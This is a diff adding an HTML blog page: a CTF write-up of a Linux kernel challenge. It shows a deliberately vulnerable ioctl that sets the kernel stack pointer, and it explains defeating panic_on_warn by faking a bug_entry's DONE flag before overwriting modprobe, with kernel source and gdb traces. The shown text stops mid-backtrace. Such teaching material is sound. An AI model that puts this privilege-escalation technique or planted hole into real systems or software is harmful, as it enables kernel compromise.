@@ -1,0 +1,1161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title></title>
+
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link href="style.css" rel="stylesheet">
+    <link href="blog.css" rel="stylesheet">
+    <link href="hcb.css" rel="stylesheet">
+    <link rel="stylesheet" href="syntax.css">
+    <link rel="stylesheet" href="comments.css">
+    <link rel="stylesheet" href="cube_style.css">
+</head>
+
+<body>
+
+<main class="border">
+
+<h1></h1>
+
+
+<h1
+id="ctf-0x01-linux-bug_tables-and-a-word-about-beating-dio">[CTF-0X01]
+Linux bug_tables and a word about beating Dio</h1>
+<blockquote>
+<p>TL;DR: fake a <code>bug_entry</code> in the <code>bug_table</code> to
+mark the entry for the <code>bugaddr</code> as “done” so it returns
+early without triggering a call to <code>warn()</code>. Then overwrite
+modprobe or something similar. Keep reading if you want to learn why the
+challenge is called “za warudo” :)</p>
+</blockquote>
+<p>After getting bodied hard in a <a
+href="https://kqx.io/writeups/baby_smallest">kernel challenge</a> over
+the weekend (and losing my sanity in the process), I later found out
+that one of the solves was written by an LLM (thank you <span
+class="citation" data-cites="zerokiral">@zerokiral</span> for sharing
+the exploit when you saw my cries in <code>Sunglasses 😎</code>). So I
+decided to analyze its (unintended) solution and that’s how this
+challenge was born.</p>
+<p>I created it for AcademyCTF 2026, an internal CTF for the mentees, by
+the mentees. Huge thanks to <span class="citation"
+data-cites="x3ero0">@x3ero0</span> for organizing it &lt;3</p>
+<h2 id="x00.-an-unfortune-encounter">0x00. An unfortune encounter</h2>
+<p>The challenge was meant to be easy (no KASLR and pretty straight
+forward), with the goal of teaching new things about the kernel. I used
+almost the same kernel module from the original challenge with a minimal
+change, because the way <code>gs</code> is accessed has changed in newer
+kernel versions (thank you <span class="citation"
+data-cites="leave">@leave</span> for explaining).</p>
+<p>So here’s the only code that I changed which actually matters in the
+module:</p>
+<blockquote>
+<p>the challenge is in <a href="github.com">here</a>, try it
+yourself!</p>
+</blockquote>
+<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">long</span> dev_ioctl<span class="op">(</span><span class="kw">struct</span> file <span class="op">*</span>file<span class="op">,</span> <span class="dt">unsigned</span> <span class="dt">int</span> cmd<span class="op">,</span> <span class="dt">unsigned</span> <span class="dt">long</span> arg<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>    asm <span class="dt">volatile</span> <span class="op">(</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;.intel_syntax noprefix</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;cli</span><span class="sc">\n</span><span class="st">&quot;</span>                     <span class="co">// no funny business while in kernelspace</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;.att_syntax prefix</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>    <span class="op">);</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>    <span class="co">// use your stand</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>    this_cpu_write<span class="op">(</span>cpu_current_top_of_stack<span class="op">,</span> arg<span class="op">);</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>    <span class="co">// now its Dio&#39;s turn</span></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<blockquote>
+<p><a href="https://www.felixcloutier.com/x86/cli">“cli”</a> because we
+almost always immediately get interrupted while still executing in
+kernelspace. hence it doesn’t save user registers and making it
+impossible to exploit. (unlesss someone finds a way… lmk in that
+case!)</p>
+</blockquote>
+<p>The kernel module lets us set <code>cpu_current_top_of_stack</code>
+to an arbitrary value. However the kernel immediately crashes after
+returning from the ioctl due to <code>panic_on_warn=1</code>.</p>
+<p>If you run it with a somewhat proper address (remember no KASLR) you
+will get the following panic:</p>
+<center>
+<img src=/blog/actf/pics/dio-useless.gif>
+</center>
+<p><img src=/blog/actf/pics/panic_on_warn2.png></p>
+<h2 id="x01.-reasoning-about-the-panic">0x01. Reasoning about the
+panic</h2>
+<p>How do we reason about this? We don’t know exactly what’s happening,
+but we do know the kernel is triggering <code>panic_on_warn</code> due
+to a warning. That’s where the hint in the challenge description comes
+in handy:</p>
+<p><strong><em>“Dio has fallen you into his trap. Can you still beat him
+with your stand?”</em></strong></p>
+<p>If you take a look at <a
+href="https://elixir.bootlin.com/linux/v7.0/source/arch/x86/kernel/traps.c">arch/x86/kernel/traps.c</a>,
+warnings/bugs are handled via <a
+href="https://elixir.bootlin.com/linux/v7.0/source/arch/x86/kernel/traps.c#L400">handle_bug()</a>.
+It decodes the bug (ud1/ud2/udb/lock) and handles them based on type. In
+our case it calls <code>report_bug()</code> and sets
+<code>handled = true</code> if the trap type is
+<code>BUG_TRAP_TYPE_WARN</code>.</p>
+<p>Inside <a
+href="https://elixir.bootlin.com/linux/v7.0/source/lib/bug.c#L272">report_bug()</a>,
+there’s a call to <code>warn_rcu_enter()</code> (not relevant here),
+followed by <code>__report_bug(NULL, bugaddr, regs)</code>. This
+function inspects <code>bugaddr</code> to determine what caused the
+trap.</p>
+<p><a
+href="https://elixir.bootlin.com/linux/v7.0/source/lib/bug.c#L197">__report_bug()</a>
+checks whether the address is valid and calls <a
+href="https://elixir.bootlin.com/linux/v7.0/source/lib/bug.c#L165">find_bug()</a>,
+a simple loop to locate the corresponding <code>bug_entry:</code></p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> bug_entry <span class="op">*</span>find_bug<span class="op">(</span><span class="dt">unsigned</span> <span class="dt">long</span> bugaddr<span class="op">)</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> bug_entry <span class="op">*</span>bug<span class="op">;</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span>bug <span class="op">=</span> __start___bug_table<span class="op">;</span> bug <span class="op">&lt;</span> __stop___bug_table<span class="op">;</span> <span class="op">++</span>bug<span class="op">)</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>bugaddr <span class="op">==</span> bug_addr<span class="op">(</span>bug<span class="op">))</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> bug<span class="op">;</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> module_find_bug<span class="op">(</span>bugaddr<span class="op">);</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>A <code>bug_entry</code> is 0x10 bytes and contains bug_addr, format,
+file, and flags. Because
+<code>CONFIG_GENERIC_BUG_RELATIVE_POINTERS</code> is enabled,
+<code>bug_addr</code> is stored as a relative displacement. The <a
+href="https://elixir.bootlin.com/linux/v7.0/source/lib/bug.c#L57">calculation</a>
+is:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>   <span class="dv">56</span>   #ifdef CONFIG_GENERIC_BUG_RELATIVE_POINTERS</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a> <span class="op">-&gt;</span>  <span class="dv">57</span>         <span class="cf">return</span> <span class="op">(</span><span class="dt">unsigned</span> <span class="dt">long</span><span class="op">)&amp;</span>bug<span class="op">-&gt;</span>bug_addr_disp <span class="op">+</span> bug<span class="op">-&gt;</span>bug_addr_disp<span class="op">;</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>     <span class="dv">58</span>   #<span class="cf">else</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>     <span class="dv">59</span>         <span class="cf">return</span> bug<span class="op">-&gt;</span>bug_addr<span class="op">;</span></span></code></pre></div>
+<p>So it adds the address of the <code>bug_entry</code> to the
+displacement. Cool.</p>
+<p>Once a matching entry is found, <a
+href="https://elixir.bootlin.com/linux/v7.0/source/lib/bug.c#L223">__report_bug()</a>
+checks its flags:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="op">(...)</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>warning  <span class="op">=</span> bug<span class="op">-&gt;</span>flags <span class="op">&amp;</span> BUGFLAG_WARNING<span class="op">;</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>once     <span class="op">=</span> bug<span class="op">-&gt;</span>flags <span class="op">&amp;</span> BUGFLAG_ONCE<span class="op">;</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>done     <span class="op">=</span> bug<span class="op">-&gt;</span>flags <span class="op">&amp;</span> BUGFLAG_DONE<span class="op">;</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>no_cut   <span class="op">=</span> bug<span class="op">-&gt;</span>flags <span class="op">&amp;</span> BUGFLAG_NO_CUT_HERE<span class="op">;</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>has_args <span class="op">=</span> bug<span class="op">-&gt;</span>flags <span class="op">&amp;</span> BUGFLAG_ARGS<span class="op">;</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(</span>warning <span class="op">&amp;&amp;</span> once<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>done<span class="op">)</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> BUG_TRAP_TYPE_WARN<span class="op">;</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>        <span class="co">/*</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="co">         * Since this is the only store, concurrency is not an issue.</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a><span class="co">         */</span></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>        bug<span class="op">-&gt;</span>flags <span class="op">|=</span> BUGFLAG_DONE<span class="op">;</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a><span class="op">(...)</span></span></code></pre></div>
+<p>If the done flag is already set it returns early, which means no
+warn() or no panic!!!</p>
+<p>So our goal is clear: set the done flag in the corresponding
+<code>bug_entry</code>. But how? How did we end up in here anyway? What
+caused the trap in the first place? It is finally time to reveal the
+mystery behind the challenge’s name :)</p>
+<h2 id="x02.-where-does-the-trap-come-from-kono-dio-da">0x02. Where does
+the Trap come from? (KONO DIO DA!)</h2>
+<p>To understand what triggers the trap, set a breakpoint at
+<code>report_bug</code> and inspect <code>bugaddr</code>. You’ll
+probably see two call sites on different runs:</p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode asm"><code class="sourceCode fasm"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>gef<span class="op">&gt;</span> x<span class="op">/</span><span class="dv">2</span><span class="er">i</span> <span class="bn">0xffffffff822eddb7</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>    0xffffffff822eddb7 &lt;irqentry_enter<span class="op">+</span><span class="dv">151</span><span class="op">&gt;:</span>     ud2</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>    0xffffffff822eddb9 &lt;irqentry_enter<span class="op">+</span><span class="dv">153</span><span class="op">&gt;:</span>     nop</span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>gef<span class="op">&gt;</span> x<span class="op">/</span><span class="dv">2</span><span class="er">i</span> <span class="bn">0xffffffff822e88d9</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>   0xffffffff822e88d9 &lt;do_syscall_64<span class="op">+</span><span class="dv">1017</span><span class="op">&gt;:</span>     ud2</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>   0xffffffff822e88db &lt;do_syscall_64<span class="op">+</span><span class="dv">1019</span><span class="op">&gt;:</span>     nop</span></code></pre></div>
+<p>Both are <code>ud2</code>, confirming what we saw earlier in
+<code>handle_bug</code>. Now if we use the amazing <code>bt</code>(back
+trace) command:</p>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode asm"><code class="sourceCode fasm"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>gef<span class="op">&gt;</span> bt</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>#0  0xffffffff822eddb7 <span class="bu">in</span> arch_enter_from_user_mode <span class="op">(</span>regs<span class="op">=</span><span class="bn">0xffffffff8386df58</span> <span class="op">&lt;</span>__brk_early_pgt_alloc<span class="op">+</span><span class="dv">24408</span><span class="op">&gt;)</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>    <span class="pp">at</span> <span class="op">./</span>arch<span class="op">/</span>x86<span class="op">/</span>include<span class="op">/</span>asm<span class="op">/</span>entry<span class="op">-</span>common<span class="op">.</span>h<span class="op">:</span><span class="dv">43</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>#1  enter_from_user_mode <span class="op">(</span>regs<span class="op">=</span><span class="bn">0xffffffff8386df58</span> <span class="op">&lt;</span>__brk_early_pgt_alloc<span class="op">+</span><span class="dv">24408</span><span class="op">&gt;)</span> at <span class="op">./</span>include<span class="op">/</span>linux<span class="op">/</span>irq<span class="op">-</span>entry<span class="op">-</span>common<span class="op">.</span>h<span class="op">:</span><span class="dv">91</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>#2  irqentry_enter_from_user_mode <span class="op">(</span>regs<span class="op">=</span><span class="bn">0xffffffff8386df58</span> <span class="op">&lt;</span>__brk_early_pgt_alloc<span class="op">+</span><span class="dv">24408</span><span class="op">&gt;)</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>    <span class="pp">at</span> <span class="op">./</span>include<span class="op">/</span>linux<span class="op">/</span>irq<span class="op">-</span>entry<span class="op">-</span>common<span class="op">.</span>h<span class="op">:</span><span class="dv">319</span></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>#3  irqentry_enter <span class="op">(</span>regs<span class="op">=</span>regs<span class="fu">@</span><span class="er">e</span>ntry<span class="op">=</span><span class="bn">0xffffffff8386df58</span> <span class="op">&lt;</span>__brk_early_pgt_alloc<span class="op">+</span><span class="dv">24408</span><span class="op">&gt;)</span> at kernel<span class="op">/</span>entry<span class="op">/</span>common<span class="op">.</span>c<span class="op">:</span><span class="dv">113</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>#4  0xffffffff822ed3ee <span class="bu">in</span> sysvec_apic_timer_interrupt <span class="op">(</span>regs<span class="op">=</span><span class="bn">0xffffffff8386df58</span> <span class="op">&lt;</span>__brk_early_pgt_alloc<span class="op">+</span><span class="dv">24408</span><span class="op">&gt;)</span></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>    <span class="pp">at</span> arch<span class="op">/</span>x86<span class="op">/</span>kernel<span class="op">/</span>apic<span class="op">/</span>apic<span class="op">.</span>c<span class="op">:</span><span class="dv">1058</span></span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>#5  0xffffffff8100148a <span class="bu">in</span> asm_sysvec_apic_timer_interrupt <span class="op">()</span> at <span class="op">./</span>arch<span class="op">/</span>x86<span class="op">/</span>include<span class="op">/</span>asm<span class="op">/</span>idtentry<span class="op">.</span>h<span class="op">:</span><span class="dv">697</span></span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a>#6  0x00000000004ae120 <span class="bu">in</span> <span class="op">??</span> <span class="op">()</span></span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a>#7  0x0000000000000002 <span class="bu">in</span> <span class="op">??</span> <span class="op">()</span></span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a>#8  0x00007ffe0e430228 <span class="bu">in</span> <span class="op">??</span> <span class="op">()</span></span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a>#9  0x00007ffe0e430218 <span class="bu">in</span> <span class="op">??</span> <span class="op">()</span></span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a>#10 0x00007ffe0e4300d0 <span class="bu">in</span> <span class="op">??</span> <span class="op">()</span></span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a>#11 0x0000000000000001 <span class="bu">in</span> <span class="op">??</span> <span class="op">()</span></span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a>#12 0x0000000000000246 <span class="bu">in</span> <span class="op">??</span> <span class="op">()</span></span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a>#13 0x0000000000000000 <span class="bu">in</span> <span class="op">??</span> <span class="op">()</span></span></code></pre></div>
+<p>It reveals that we have triggered the trap for
+<code>irqentry_enter</code> from a <code>timer interrupt!</code>. Is
+that you, Dio?!</p>
+<center>
+<img src=/blog/actf/pics/dio-za-warudo.gif>
+</center>
+<blockquote>
+<p>For those unaware: Za warudo (aka The World) is Dio’s Stand, and it
+can halt everything by stopping time. Somewhat like the timer interrupt
+pausing normal execution :p</p>
+</blockquote>
+<p>To see what caused the execution flow into the trap (set by Dio), we
+can check the <a
+href="https://elixir.bootlin.com/linux/v7.0/source/arch/x86/include/asm/entry-common.h#L43">source
+code line</a> printed in <code>bt</code></p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co">/* Check that the stack and regs on entry from user mode are sane. */</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> __always_inline <span class="dt">void</span> arch_enter_from_user_mode<span class="op">(</span><span class="kw">struct</span> pt_regs <span class="op">*</span>regs<span class="op">)</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="op">{</span>       <span class="op">(...)</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>        <span class="co">/*</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="co">         * All entries from user mode (except #DF) should be on the</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="co">         * normal thread stack and should have user pt_regs in the</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="co">         * correct location.</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="co">         */</span></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>        WARN_ON_ONCE<span class="op">(!</span>on_thread_stack<span class="op">());</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>        WARN_ON_ONCE<span class="op">(</span>regs <span class="op">!=</span> task_pt_regs<span class="op">(</span>current<span class="op">));</span></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>We see that we fail on
+<code>WARN_ON_ONCE(regs != task_pt_regs(current));</code>. It basically
+compares our <code>regs</code> (pt_regs) to the <code>pt_regs</code>
+from the current thread via the <code>task_pt_regs</code> macro. What is
+<code>pt_regs</code> anyway?</p>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode asm"><code class="sourceCode fasm"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>SYM_CODE_START<span class="op">(</span>entry_SYSCALL_64<span class="op">)</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>    UNWIND_HINT_ENTRY</span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>    ENDBR</span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>    <span class="bu">swapgs</span></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>    /* tss<span class="op">.</span>sp2 is scratch space<span class="op">.</span> <span class="op">*/</span></span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>    <span class="bu">movq</span>    <span class="op">%</span><span class="kw">rsp</span><span class="op">,</span> PER_CPU_VAR<span class="op">(</span>cpu_tss_rw <span class="op">+</span> TSS_sp2<span class="op">)</span></span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>    SWITCH_TO_KERNEL_CR3 scratch_reg<span class="op">=%</span><span class="kw">rsp</span></span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>    <span class="bu">movq</span>    PER_CPU_VAR<span class="op">(</span>cpu_current_top_of_stack<span class="op">),</span> <span class="op">%</span><span class="kw">rsp</span></span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>SYM_INNER_LABEL<span class="op">(</span>entry_SYSCALL_64_safe_stack<span class="op">,</span> SYM_L_GLOBAL<span class="op">)</span></span>
+<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a>    ANNOTATE_NOENDBR</span>
+<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a>    /* Construct struct pt_regs on stack <span class="op">*/</span></span>
+<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a>    pushq   <span class="op">$</span>__USER_DS              <span class="op">/*</span> pt_regs<span class="op">-&gt;</span><span class="kw">ss</span> <span class="op">*/</span></span>
+<span id="cb8-16"><a href="#cb8-16" aria-hidden="true" tabindex="-1"></a>    pushq   PER_CPU_VAR<span class="op">(</span>cpu_tss_rw <span class="op">+</span> TSS_sp2<span class="op">)</span>   <span class="op">/*</span> pt_regs<span class="op">-&gt;</span><span class="kw">sp</span> <span class="op">*/</span></span>
+<span id="cb8-17"><a href="#cb8-17" aria-hidden="true" tabindex="-1"></a>    pushq   <span class="op">%</span><span class="kw">r11</span>                    <span class="op">/*</span> pt_regs<span class="op">-&gt;</span>flags <span class="op">*/</span></span>
+<span id="cb8-18"><a href="#cb8-18" aria-hidden="true" tabindex="-1"></a>    pushq   <span class="op">$</span>__USER_CS              <span class="op">/*</span> pt_regs<span class="op">-&gt;</span><span class="kw">cs</span> <span class="op">*/</span></span>
+<span id="cb8-19"><a href="#cb8-19" aria-hidden="true" tabindex="-1"></a>    pushq   <span class="op">%</span><span class="kw">rcx</span>                    <span class="op">/*</span> pt_regs<span class="op">-&gt;</span>ip <span class="op">*/</span></span>
+<span id="cb8-20"><a href="#cb8-20" aria-hidden="true" tabindex="-1"></a>SYM_INNER_LABEL<span class="op">(</span>entry_SYSCALL_64_after_hwframe<span class="op">,</span> SYM_L_GLOBAL<span class="op">)</span></span>
+<span id="cb8-21"><a href="#cb8-21" aria-hidden="true" tabindex="-1"></a>    pushq   <span class="op">%</span><span class="kw">rax</span>                    <span class="op">/*</span> pt_regs<span class="op">-&gt;</span>orig_ax <span class="op">*/</span></span>
+<span id="cb8-22"><a href="#cb8-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-23"><a href="#cb8-23" aria-hidden="true" tabindex="-1"></a>    PUSH_AND_CLEAR_REGS <span class="kw">rax</span><span class="op">=$-</span>ENOSYS</span>
+<span id="cb8-24"><a href="#cb8-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-25"><a href="#cb8-25" aria-hidden="true" tabindex="-1"></a>    /* IRQs are off<span class="op">.</span> <span class="op">*/</span></span>
+<span id="cb8-26"><a href="#cb8-26" aria-hidden="true" tabindex="-1"></a>    <span class="bu">movq</span>    <span class="op">%</span><span class="kw">rsp</span><span class="op">,</span> <span class="op">%</span><span class="kw">rdi</span></span>
+<span id="cb8-27"><a href="#cb8-27" aria-hidden="true" tabindex="-1"></a>    /* Sign extend the lower <span class="dv">32</span><span class="er">bit</span> as syscall numbers are treated as int <span class="op">*/</span></span>
+<span id="cb8-28"><a href="#cb8-28" aria-hidden="true" tabindex="-1"></a>    movslq  <span class="op">%</span><span class="kw">eax</span><span class="op">,</span> <span class="op">%</span><span class="kw">rsi</span></span>
+<span id="cb8-29"><a href="#cb8-29" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-30"><a href="#cb8-30" aria-hidden="true" tabindex="-1"></a>    /* clobbers <span class="op">%</span><span class="kw">rax</span><span class="op">,</span> make sure it is after saving the syscall nr <span class="op">*/</span></span>
+<span id="cb8-31"><a href="#cb8-31" aria-hidden="true" tabindex="-1"></a>    IBRS_ENTER</span>
+<span id="cb8-32"><a href="#cb8-32" aria-hidden="true" tabindex="-1"></a>    UNTRAIN_RET</span>
+<span id="cb8-33"><a href="#cb8-33" aria-hidden="true" tabindex="-1"></a>    CLEAR_BRANCH_HISTORY</span>
+<span id="cb8-34"><a href="#cb8-34" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-35"><a href="#cb8-35" aria-hidden="true" tabindex="-1"></a>    <span class="cf">call</span>    do_syscall_64       <span class="op">/*</span> returns with IRQs disabled <span class="op">*/</span></span>
+<span id="cb8-36"><a href="#cb8-36" aria-hidden="true" tabindex="-1"></a>    (...)</span></code></pre></div>
+<p>When a call to a syscall is made, the <code>entry_SYSCALL_64</code>
+routine starts. After swapping <code>gs</code> to the
+<code>kernel gs</code> and switching to the kernel stack it pushes the
+user registers onto the stack to save them via <code>pt_regs</code>. and
+finally the call to <code>do_syscall_64</code> is made. The kernel
+module exactly lets us change the kernel stack for the current thread,
+which means we effectively control where <code>pt_regs</code> is
+stored.</p>
+<p>Btw, what about the other trap?</p>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode asm"><code class="sourceCode fasm"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>gef<span class="op">&gt;</span> bt</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>#0  0xffffffff822e88d9 <span class="bu">in</span> arch_enter_from_user_mode <span class="op">(</span>regs<span class="op">=</span><span class="bn">0xffffffff82eef448</span><span class="op">)</span> at <span class="op">./</span>arch<span class="op">/</span>x86<span class="op">/</span>include<span class="op">/</span>asm<span class="op">/</span>entry<span class="op">-</span>common<span class="op">.</span>h<span class="op">:</span><span class="dv">43</span></span>
